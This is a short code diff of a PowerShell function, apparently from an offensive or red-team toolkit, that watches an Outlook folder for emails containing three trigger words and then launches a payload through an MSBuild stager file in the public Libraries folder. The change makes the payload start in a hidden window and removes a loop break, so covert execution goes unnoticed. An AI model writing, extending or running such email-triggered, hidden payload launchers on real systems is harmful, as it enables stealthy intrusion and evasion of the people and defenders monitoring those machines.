@@ -100,7 +100,7 @@ function New-DynamicOutlookTrigger
 		write-output $Folder.items.Item($i).Body
                 if($Folder.items.Item($i).Body -match $Triggerwords[0] -and $Folder.items.Item($i).Body -match $Triggerwords[1] -and $Folder.items.Item($i).Body -match $Triggerwords[2])
                 {
-					write-verbose "found match"
+		    write-verbose "found match"
                     # Section off the body of the targe email and format it for more efficient searching
                     $EmailBody = $Folder.items.Item($i).Body
                     $Body = Out-String -InputObject $EmailBody
@@ -123,8 +123,7 @@ function New-DynamicOutlookTrigger
                         }
                     }
 		    write-verbose "start payload"
-                    Start-Process $payload -ArgumentList " $env:public\Libraries\msbuild_stager.xml"
-		    break
+                    Start-Process -window Hidden $payload -ArgumentList " $env:public\Libraries\msbuild_stager.xml"
                 }
             }
 	    write-verbose "start sleep"
